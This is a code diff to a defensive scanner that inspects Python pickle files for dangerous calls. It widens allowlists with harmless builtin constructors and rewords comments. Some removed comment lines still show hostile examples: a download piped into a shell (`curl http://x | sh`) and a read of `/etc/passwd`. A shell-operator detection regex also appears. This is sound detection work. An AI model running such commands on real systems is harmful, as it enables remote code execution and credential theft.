@@ -153,6 +153,13 @@ PICKLE_ALLOWED_GLOBALS: frozenset[str] = frozenset({
     # ordinary sklearn and pandas pickles, and only became visible here once
     # the walk learned to resync past raw array bytes.
     "builtins.slice",
+    # Constructors of plain values: they build data and run nothing, like their
+    # container siblings above. They came out as an INFO "unrecognized global".
+    # getattr, type, eval and the like stay off this list on purpose.
+    "builtins.int", "builtins.float", "builtins.bool", "builtins.str",
+    "builtins.bytes", "builtins.range",
+    "__builtin__.int", "__builtin__.float", "__builtin__.bool", "__builtin__.str",
+    "__builtin__.bytes", "__builtin__.range",
     "__builtin__.set", "__builtin__.frozenset",
     "copyreg._reconstructor", "copyreg.__newobj__", "copyreg.__newobj_ex__",
     # Protocols 0 and 1 write Python 2 spellings: every plain class instance
@@ -776,7 +783,7 @@ class PickleResolvedCall:
     """A REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose callable resolved
     to a known `module.name` global AND whose argument(s) resolved entirely
     to literal constants already on the simulated stack -- e.g. the concrete
-    `('curl ... | sh',)` actually passed to `os.system`, not merely the fact
+    download-and-run shell command actually passed to `os.system`, not merely the fact
     that `os.system` is referenced somewhere in the stream. This is the
     fickling-style argument-level evidence layered on top of the existing
     global-reference walk.
@@ -1147,7 +1154,7 @@ def _walk_one_pickle(
     to a `module.name` string, and additionally resolves any
     REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose arguments are literal
     constants to a `PickleResolvedCall` (callable + concrete args) -- e.g.
-    resolving `os.system('curl ... | sh')` instead of just noting that
+    resolving `os.system` with a download-and-run command instead of just noting that
     `os.system` was referenced somewhere in the stream.
 
     Walks the opcode stream with a stack/memo simulation covering
@@ -1627,7 +1634,7 @@ def _laundered_denied_ref(qualname: str) -> str | None:
 
 _PICKLE_ARG_URL_RE = re.compile(r"\b[a-z][a-z0-9+.\-]{1,15}://", re.I)
 # A shell metacharacter adjacent to whitespace, i.e. used as an operator
-# rather than merely present. `curl http://x | sh` matches; an ordinary
+# rather than merely present. A download piped into a shell matches; an ordinary
 # value like `a;b` or a base64 blob containing `+/=` does not.
 _PICKLE_ARG_SHELL_RE = re.compile(r"\$\(|`|\s[;&|]|[;&|]\s")
 # Callables that rebuild a code object or a function from its parts. Every
@@ -1736,6 +1743,9 @@ _PICKLE_ALLOWED_STRING_ARG_OK: frozenset[str] = frozenset({
     # hex form, Fraction('1/3') (how Python 3.10 pickles one), a timezone's
     # name, and path segments, absolute ones included.
     "decimal.Decimal", "uuid.UUID", "fractions.Fraction",
+    # int('42'), float('1.5'), str('x'), bytes('abc', 'utf-8'): text in, a value out.
+    "builtins.int", "builtins.float", "builtins.str", "builtins.bytes",
+    "__builtin__.int", "__builtin__.float", "__builtin__.str", "__builtin__.bytes",
     "datetime.timezone",
     "pathlib.PurePosixPath", "pathlib.PureWindowsPath",
     "pathlib.PosixPath", "pathlib.WindowsPath",
@@ -2238,7 +2248,7 @@ def _triage_unknown_pickle_call(
         if (_PICKLE_ARG_PATH_RE.search(text) and not is_code_builder
                 and call.ref not in _PICKLE_PATH_CONSTRUCTORS):
             # Weak on its own -- `pathlib.PurePosixPath('/home/u/model.bin')`
-            # looks identical to `linecache.getline('/etc/passwd', 1)` at the
+            # looks identical to `linecache.getline` reading a system credential file at the
             # opcode level, and a file read is not code execution either way.
             # LOW is enough to clear the INFO tier that gets suppressed
             # wholesale without overstating what the evidence shows.
